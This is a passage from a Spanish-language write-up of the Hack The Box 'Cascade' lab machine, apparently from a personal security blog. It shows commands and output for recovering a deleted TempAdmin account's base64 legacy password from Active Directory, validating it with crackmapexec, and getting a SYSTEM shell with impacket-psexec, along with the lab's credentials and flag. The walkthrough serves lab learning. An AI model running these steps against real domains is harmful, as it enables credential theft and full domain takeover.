+DistinguishedName : CN=Scheduled Tasks\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local
+Name              : Scheduled Tasks
+                    DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
+ObjectClass       : group
+ObjectGUID        : 13375728-5ddb-4137-b8b8-b9041d1d3fd2
+
+Deleted           : True
+DistinguishedName : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
+Name              : {A403B701-A528-4685-A816-FDEE32BDDCBA}
+                    DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
+ObjectClass       : groupPolicyContainer
+ObjectGUID        : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
+
+Deleted           : True
+DistinguishedName : CN=Machine\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local
+Name              : Machine
+                    DEL:93c23674-e411-400b-bb9f-c0340bda5a34
+ObjectClass       : container
+ObjectGUID        : 93c23674-e411-400b-bb9f-c0340bda5a34
+
+Deleted           : True
+DistinguishedName : CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local
+Name              : User
+                    DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
+ObjectClass       : container
+ObjectGUID        : 746385f2-e3a0-4252-b83a-5a206da0ed88
+
+Deleted           : True
+DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
+Name              : TempAdmin
+                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+ObjectClass       : user
+ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059
+</code></pre></div></div>
+<ul>
+<li><p>Vemos sobre <code>TempAdmin</code> si recordamos en el correo nos decían que la contraseña de ese usuario era la misma que la del <code>admin</code>.</p>
+</li>
+<li><p>Podemos listar las propiedades y encontramos una contraseña.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">*Evil-WinRM* PS C:\Users\arksvc\Documents&gt; Get-ADObject -filter 'isDeleted -eq $true -and name -ne &quot;Deleted Objects&quot;' -includeDeletedObjects -Properties *
+
+
+accountExpires                  : 9223372036854775807
+badPasswordTime                 : 0
+badPwdCount                     : 0
+CanonicalName                   : cascade.local/Deleted Objects/CASC-WS1
+                                  DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
+CN                              : CASC-WS1
+                                  DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
+codePage                        : 0
+countryCode                     : 0
+Created                         : 1/9/2020 7:30:19 PM
+createTimeStamp                 : 1/9/2020 7:30:19 PM
+Deleted                         : True
+Description                     :
+DisplayName                     :
+DistinguishedName               : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
+dSCorePropagationData           : {1/17/2020 3:37:36 AM, 1/17/2020 12:14:04 AM, 1/9/2020 7:30:19 PM, 1/1/1601 12:04:17 AM}
+instanceType                    : 4
+isCriticalSystemObject          : False
+isDeleted                       : True
+LastKnownParent                 : OU=Computers,OU=UK,DC=cascade,DC=local
+lastLogoff                      : 0
+lastLogon                       : 0
+localPolicyFlags                : 0
+logonCount                      : 0
+Modified                        : 1/28/2020 6:08:35 PM
+modifyTimeStamp                 : 1/28/2020 6:08:35 PM
+msDS-LastKnownRDN               : CASC-WS1
+Name                            : CASC-WS1
+                                  DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
+nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  :
+ObjectClass                     : computer
+ObjectGUID                      : 6d97daa4-2e82-4946-a11e-f91fa18bfabe
+objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1108
+primaryGroupID                  : 515
+ProtectedFromAccidentalDeletion : False
+pwdLastSet                      : 132230718192147073
+sAMAccountName                  : CASC-WS1$
+sDRightsEffective               : 0
+userAccountControl              : 4128
+uSNChanged                      : 245849
+uSNCreated                      : 24603
+whenChanged                     : 1/28/2020 6:08:35 PM
+whenCreated                     : 1/9/2020 7:30:19 PM
+
+CanonicalName                   : cascade.local/Deleted Objects/Scheduled Tasks
+                                  DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
+CN                              : Scheduled Tasks
+                                  DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
+Created                         : 1/13/2020 5:21:53 PM
+createTimeStamp                 : 1/13/2020 5:21:53 PM
+Deleted                         : True
+Description                     :
+DisplayName                     :
+DistinguishedName               : CN=Scheduled Tasks\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local
+dSCorePropagationData           : {1/17/2020 9:35:46 PM, 1/17/2020 9:32:57 PM, 1/17/2020 3:37:36 AM, 1/17/2020 12:14:04 AM...}
+groupType                       : -2147483644
+instanceType                    : 4
+isDeleted                       : True
+LastKnownParent                 : OU=Groups,OU=UK,DC=cascade,DC=local
+Modified                        : 1/28/2020 6:07:55 PM
+modifyTimeStamp                 : 1/28/2020 6:07:55 PM
+msDS-LastKnownRDN               : Scheduled Tasks
+Name                            : Scheduled Tasks
+                                  DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
+nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  :
+ObjectClass                     : group
+ObjectGUID                      : 13375728-5ddb-4137-b8b8-b9041d1d3fd2
+objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1131
+ProtectedFromAccidentalDeletion : False
+sAMAccountName                  : Scheduled Tasks
+sDRightsEffective               : 0
+uSNChanged                      : 245848
+uSNCreated                      : 114790
+whenChanged                     : 1/28/2020 6:07:55 PM
+whenCreated                     : 1/13/2020 5:21:53 PM
+
+CanonicalName                   : cascade.local/Deleted Objects/{A403B701-A528-4685-A816-FDEE32BDDCBA}
+                                  DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
+CN                              : {A403B701-A528-4685-A816-FDEE32BDDCBA}
+                                  DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
+Created                         : 1/26/2020 2:34:30 AM
+createTimeStamp                 : 1/26/2020 2:34:30 AM
+Deleted                         : True
+Description                     :
+DisplayName                     : Block Potato
+DistinguishedName               : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
+dSCorePropagationData           : {1/1/1601 12:00:00 AM}
+flags                           : 0
+gPCFileSysPath                  : \\cascade.local\SysVol\cascade.local\Policies\{A403B701-A528-4685-A816-FDEE32BDDCBA}
+gPCFunctionalityVersion         : 2
+gPCMachineExtensionNames        : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1D-2488-11D1-A28C-00C04FB94F17}][{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}{53D6AB1D-2488-11D1-A28C-00C04FB94F17}]
+instanceType                    : 4
+isDeleted                       : True
+LastKnownParent                 : CN=Policies,CN=System,DC=cascade,DC=local
+Modified                        : 1/26/2020 2:40:52 AM
+modifyTimeStamp                 : 1/26/2020 2:40:52 AM
+msDS-LastKnownRDN               : {A403B701-A528-4685-A816-FDEE32BDDCBA}
+Name                            : {A403B701-A528-4685-A816-FDEE32BDDCBA}
+                                  DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
+nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  :
+ObjectClass                     : groupPolicyContainer
+ObjectGUID                      : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
+ProtectedFromAccidentalDeletion : False
+sDRightsEffective               : 0
+showInAdvancedViewOnly          : True
+uSNChanged                      : 196701
+uSNCreated                      : 196688
+versionNumber                   : 2
+whenChanged                     : 1/26/2020 2:40:52 AM
+whenCreated                     : 1/26/2020 2:34:30 AM
+
+CanonicalName                   : cascade.local/Deleted Objects/Machine
+                                  DEL:93c23674-e411-400b-bb9f-c0340bda5a34
+CN                              : Machine
+                                  DEL:93c23674-e411-400b-bb9f-c0340bda5a34
+Created                         : 1/26/2020 2:34:31 AM
+createTimeStamp                 : 1/26/2020 2:34:31 AM
+Deleted                         : True
+Description                     :
+DisplayName                     :
+DistinguishedName               : CN=Machine\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local
+dSCorePropagationData           : {1/1/1601 12:00:00 AM}
+instanceType                    : 4
+isDeleted                       : True
+LastKnownParent                 : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
+Modified                        : 1/26/2020 2:40:52 AM
+modifyTimeStamp                 : 1/26/2020 2:40:52 AM
+msDS-LastKnownRDN               : Machine
+Name                            : Machine
+                                  DEL:93c23674-e411-400b-bb9f-c0340bda5a34
+nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  :
+ObjectClass                     : container
+ObjectGUID                      : 93c23674-e411-400b-bb9f-c0340bda5a34
+ProtectedFromAccidentalDeletion : False
+sDRightsEffective               : 0
+showInAdvancedViewOnly          : True
+uSNChanged                      : 196699
+uSNCreated                      : 196689
+whenChanged                     : 1/26/2020 2:40:52 AM
+whenCreated                     : 1/26/2020 2:34:31 AM
+
+CanonicalName                   : cascade.local/Deleted Objects/User
+                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
+CN                              : User
+                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
+Created                         : 1/26/2020 2:34:31 AM
+createTimeStamp                 : 1/26/2020 2:34:31 AM
+Deleted                         : True
+Description                     :
+DisplayName                     :
+DistinguishedName               : CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local
+dSCorePropagationData           : {1/1/1601 12:00:00 AM}
+instanceType                    : 4
+isDeleted                       : True
+LastKnownParent                 : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
+Modified                        : 1/26/2020 2:40:52 AM
+modifyTimeStamp                 : 1/26/2020 2:40:52 AM
+msDS-LastKnownRDN               : User
+Name                            : User
+                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
+nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  :
+ObjectClass                     : container
+ObjectGUID                      : 746385f2-e3a0-4252-b83a-5a206da0ed88
+ProtectedFromAccidentalDeletion : False
+sDRightsEffective               : 0
+showInAdvancedViewOnly          : True
+uSNChanged                      : 196700
+uSNCreated                      : 196690
+whenChanged                     : 1/26/2020 2:40:52 AM
+whenCreated                     : 1/26/2020 2:34:31 AM
+
+accountExpires                  : 9223372036854775807
+badPasswordTime                 : 0
+badPwdCount                     : 0
+CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
+CN                              : TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+codePage                        : 0
+countryCode                     : 0
+Created                         : 1/27/2020 3:23:08 AM
+createTimeStamp                 : 1/27/2020 3:23:08 AM
+Deleted                         : True
+Description                     :
+DisplayName                     : TempAdmin
+DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
+dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
+givenName                       : TempAdmin
+instanceType                    : 4
+isDeleted                       : True
+LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
+lastLogoff                      : 0
+lastLogon                       : 0
+logonCount                      : 0
+Modified                        : 1/27/2020 3:24:34 AM
+modifyTimeStamp                 : 1/27/2020 3:24:34 AM
+msDS-LastKnownRDN               : TempAdmin
+Name                            : TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  :
+ObjectClass                     : user
+ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
+objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
+primaryGroupID                  : 513
+ProtectedFromAccidentalDeletion : False
+pwdLastSet                      : 132245689883479503
+sAMAccountName                  : TempAdmin
+sDRightsEffective               : 0
+userAccountControl              : 66048
+userPrincipalName               : TempAdmin@cascade.local
+uSNChanged                      : 237705
+uSNCreated                      : 237695
+whenChanged                     : 1/27/2020 3:24:34 AM
+whenCreated                     : 1/27/2020 3:23:08 AM
+</code></pre></div></div>
+<ul>
+<li><p><code>cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVz</code>.</p>
+</li>
+<li><p>Vemos la contraseña en texto plano.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content echo YmFDVDNyMWFOMDBkbGVz | base64 -d
+baCT3r1aN00dles
+</code></pre></div></div>
+<h2 id="root-txt">root.txt</h2>
+<ul>
+<li>Comprobamos que son sus credenciales.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content crackmapexec winrm 10.10.10.182 -u administrator -p baCT3r1aN00dles
+SMB         10.10.10.182    5985   CASC-DC1         [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local)
+HTTP        10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
+WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\administrator:baCT3r1aN00dles (Pwn3d!)
+</code></pre></div></div>
+<ul>
+<li>Podemos ver la <code>flag</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content impacket-psexec cascade.local/administrator:'baCT3r1aN00dles'@10.10.10.182
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Requesting shares on 10.10.10.182.....
+[*] Found writable share ADMIN$
+[*] Uploading file DMBizKaJ.exe
+[*] Opening SVCManager on 10.10.10.182.....
+[*] Creating service HMRm on 10.10.10.182.....
+[*] Starting service HMRm.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32&gt; whoami
+nt authority\system
+
+C:\Windows\system32&gt;
+</code></pre></div></div>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">C:\Windows\system32&gt; type C:\Users\administrator\desktop\root.txt
+144f061bdfde9e97418da481e7228dba
+</code></pre></div></div>
+</article></div></main>
+<footer class="footer wrap"><div><b>MR<em>7</em></b><div>Cybersecurity notes &amp; writeups.</div></div><div class="footer-links"><a href="https://github.com/MikeRega7">GitHub</a><a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278">LinkedIn</a><a href="https://www.instagram.com/_miguelitornuno7">Instagram</a></div></footer>
+<script src="/app.js?v=10"></script></body></html>
